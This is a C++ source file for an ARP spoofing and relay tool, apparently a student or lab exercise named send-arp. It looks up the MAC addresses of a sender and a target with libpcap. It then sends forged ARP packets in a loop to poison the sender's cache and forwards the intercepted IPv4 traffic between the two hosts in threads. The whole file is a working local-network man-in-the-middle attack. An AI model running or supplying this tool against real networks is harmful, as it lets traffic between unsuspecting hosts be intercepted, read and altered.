#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>
#include <thread>
#include <time.h> 
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

typedef struct _IPv4Header{    
    unsigned char hlen : 4;
    unsigned char version : 4;
    unsigned char tos;
    ushort tlen;
    ushort id;
    ushort fl_off;
#define DONT_FRAG(x) (x&0x40)
#define MORE_FRAG(x) (x&0x20)
#define FRAG_OFF(x) ntohs(x&0xFF1F)
    unsigned char ttl;
    unsigned char protocol;
    ushort checksum;
    uint srcaddr;
    uint dstaddr;
}IPv4hdr;

struct EthIpPacket {
	EthHdr eth_;
	IPv4hdr ip_;
};
#pragma pack(pop)

char *my_ip;
char my_mac[18];

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void poisoning(int argc, char *argv[], int i){
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	char* sender = argv[2*i];
	char* target = argv[2*i+1];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	while(1){
		sleep(1);
		if (handle == nullptr) {
			printf("couldn't open device %s(%s)\n", dev, errbuf);
		}
		Mac you_mac;
		EthArpPacket packet;
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); 
		packet.eth_.smac_ = Mac(my_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(my_mac);
		packet.arp_.sip_ = htonl(Ip(my_ip));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sender));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		for (int j = 0; j < 10; j++){
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				continue;
			}
			
			EthHdr* eth = (EthHdr*)packet;
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
			if (eth->type() == EthHdr::Arp && arp->op() == ArpHdr::Reply && arp->sip() == Ip(sender)){
				you_mac = arp->smac();
				break;
			}
		}
		std::string you_mac_str = std::string(you_mac);
		printf("Poisoning %s %s\n\n", you_mac_str.c_str(), sender);

		packet.eth_.dmac_ = Mac(you_mac_str); 
		packet.eth_.smac_ = Mac(my_mac);
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = Mac(my_mac);
		packet.arp_.sip_ = htonl(Ip(target));
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(sender));
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	}
	pcap_close(handle);
}

void relay(int argc, char** argv, int i, std::string gate_mac_str, std::string you_mac_str){
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	while(1){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			continue;
		}
		EthHdr* ether = (EthHdr*)packet;
		if (ether->type() == 0x0800){
			IPv4hdr* iphdr = (IPv4hdr*)(packet + sizeof(EthHdr));
			if ((ntohl(iphdr->srcaddr) == Ip(argv[2*i]))||(ntohl(iphdr->dstaddr) == Ip(argv[2*i]))){
				ether->smac_ = Mac(my_mac);
				if (ntohl(iphdr->srcaddr)==Ip(argv[2*i])){
					ether->dmac_ = Mac(gate_mac_str);
					printf("%s(sender) -> me -> %s(target) Relay %u bytes\n\n", you_mac_str.c_str(), gate_mac_str.c_str(), header->caplen);
				}
				
				else if (ntohl(iphdr->dstaddr) ==Ip(argv[2*i])){
					ether->dmac_ = Mac(you_mac_str);
					printf("%s(target) -> me -> %s(sender) Relay %u bytes\n\n", gate_mac_str.c_str(), you_mac_str.c_str(), header->caplen);
				}
				
				res = pcap_sendpacket(handle, packet, header->caplen);
			}
		}
	}
	pcap_close(handle);
}

int main(int argc, char* argv[]) {
	if (argc%2 != 0) {
		usage();
		return -1;
	}
	int fd;
	struct ifreq ifr;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);

	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ifr.ifr_name[IFNAMSIZ - 1] = '\0';
	if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) {
		std::cerr << "Failed to get IP address" << std::endl;
		return 1;
	}
	close(fd);

	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
	char ipAddrStr[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &ipaddr->sin_addr, ipAddrStr, INET_ADDRSTRLEN);
	std::cout << "My IP: " << ipAddrStr << std::endl;
	my_ip = ipAddrStr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);
	std::cout << "MY MAC: ";
	for (int i = 0; i < 6; ++i) {
		sprintf(&my_mac[i*3], "%02X:", (unsigned char)ifr.ifr_hwaddr.sa_data[i]);
	}
	my_mac[17] = '\0'; 
	std::cout << my_mac << std::endl;
	long startTime = (long)clock();	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
				printf("couldn't open device %s(%s)\n", dev, errbuf);
	}		

	std::vector<std::thread> threads;
	for(int i=1; i<(argc/2); i++){
		char* sender = argv[2*i];
		char* target = argv[2*i+1];
		Mac you_mac;
		Mac gate_mac;
		EthArpPacket packet_for_mac;
		packet_for_mac.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); 
		packet_for_mac.eth_.smac_ = Mac(my_mac);
		packet_for_mac.eth_.type_ = htons(EthHdr::Arp);

		packet_for_mac.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet_for_mac.arp_.pro_ = htons(EthHdr::Ip4);
		packet_for_mac.arp_.hln_ = Mac::SIZE;
		packet_for_mac.arp_.pln_ = Ip::SIZE;
		packet_for_mac.arp_.op_ = htons(ArpHdr::Request);
		packet_for_mac.arp_.smac_ = Mac(my_mac);
		packet_for_mac.arp_.sip_ = htonl(Ip(my_ip));
		packet_for_mac.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet_for_mac.arp_.tip_ = htonl(Ip(sender));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_for_mac), sizeof(EthArpPacket));
		for (int j = 0; j < 10; j++){
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				continue;
			}
			
			EthHdr* eth = (EthHdr*)packet;
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
			if (eth->type() == EthHdr::Arp && arp->op() == ArpHdr::Reply && arp->sip() == Ip(sender)){
				you_mac = arp->smac();
				break;
			}
		}
		std::string you_mac_str = std::string(you_mac);

		packet_for_mac.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); 
		packet_for_mac.eth_.smac_ = Mac(my_mac);
		packet_for_mac.eth_.type_ = htons(EthHdr::Arp);

		packet_for_mac.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet_for_mac.arp_.pro_ = htons(EthHdr::Ip4);
		packet_for_mac.arp_.hln_ = Mac::SIZE;
		packet_for_mac.arp_.pln_ = Ip::SIZE;
		packet_for_mac.arp_.op_ = htons(ArpHdr::Request);
		packet_for_mac.arp_.smac_ = Mac(my_mac);
		packet_for_mac.arp_.sip_ = htonl(Ip(my_ip));
		packet_for_mac.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet_for_mac.arp_.tip_ = htonl(Ip(target));
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_for_mac), sizeof(EthArpPacket));
		for (int j = 0; j < 10; j++){
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				continue;
			}
			
			EthHdr* eth = (EthHdr*)packet;
			ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
			if (eth->type() == EthHdr::Arp && arp->op() == ArpHdr::Reply && arp->sip() == Ip(target)){
				gate_mac = arp->smac();
				break;
			}
		}
		std::string gate_mac_str = std::string(gate_mac);
		printf("Push Threads Sender : %s  Target : %s\n", you_mac_str.c_str(), gate_mac_str.c_str());
		threads.push_back(std::thread(&relay, argc, argv, i, gate_mac_str, you_mac_str));
	}

	for(int i=1; i<(argc/2); i++){
		printf("Push Threads Poisoner\n");
		threads.push_back(std::thread(&poisoning, argc, argv, i));
	}
	printf("\n");
	for(auto&p : threads) {
		p.join();
	}
	pcap_close(handle);
}
